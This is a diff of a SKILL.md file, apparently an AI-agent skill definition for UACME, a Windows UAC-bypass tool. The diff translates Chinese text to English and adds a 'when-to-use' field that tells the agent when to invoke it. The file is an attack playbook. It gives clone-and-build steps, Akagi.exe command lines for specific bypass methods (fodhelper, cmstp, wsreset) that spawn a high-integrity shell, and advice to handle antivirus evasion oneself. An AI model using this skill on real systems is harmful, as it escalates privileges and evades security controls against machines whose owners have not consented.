@@ -2,37 +2,41 @@
 name: uacme-uac-bypass
 description: "UACME: Standard user UAC bypass privilege escalation. Signals: windows privilege escalation, UAC bypass, parameterized delivery execution."
 zh-signals: "UACME: 标准用户绕过 UAC 提权。信号:windows提权,uac绕过,带参数的投递执行。"
+when-to-use: >-
+  Use on Windows when running as a standard user and you need to bypass UAC to
+  execute a command with high integrity; select a method ID compatible with the
+  target Windows version, and note output may be flagged by AV.
 ---
 
 # UACME
 
-- 攻击大类:C17 Windows本地提权
-- 上游仓库:https://github.com/hfiref0x/UACME
-- 上游 License:BSD-2-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C17 Windows Local Privilege Escalation
+- Upstream Repository: https://github.com/hfiref0x/UACME
+- Upstream License: BSD-2-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-git clone https://github.com/hfiref0x/UACME && cd UACME/Source && 用 Visual Studio 编译 Akagi.sln
+git clone https://github.com/hfiref0x/UACME && cd UACME/Source && build Akagi.sln with Visual Studio
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `Akagi.exe 61 <cmd>` | 第 61 号方法提权执行(如 cmstp) |
-| `Akagi.exe 33 cmd.exe` | fodhelper 白名单 bypass |
-| `Akagi.exe key [value] [cmd]` | 带参数的投递执行 |
+| `Akagi.exe 61 <cmd>` | Escalate and execute with method 61 (e.g. cmstp) |
+| `Akagi.exe 33 cmd.exe` | fodhelper allowlist bypass |
+| `Akagi.exe key [value] [cmd]` | Parameterized delivery execution |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 标准用户绕过 UAC 提权
+### Standard user bypasses UAC for privilege escalation
 
 ```bash
 Akagi.exe 61 cmd.exe
-# 弹出高完整性 cmd;关键方法: 33 fodhelper / 61 cmstp / 70 wsreset
+# Pops a high-integrity cmd; key methods: 33 fodhelper / 61 cmstp / 70 wsreset
 ```
 
-## 注意事项
+## Notes
 
-内置 70+ 种 UAC bypass 方法编号,方法按 Windows 版本失效,选目标系统可用的;输出物会被主流 AV 查杀,需自行免杀。
+Ships 70+ numbered UAC bypass methods; methods expire with Windows versions, so pick one that works on the target system; the output is flagged by mainstream AV, so you need to handle AV evasion yourself.
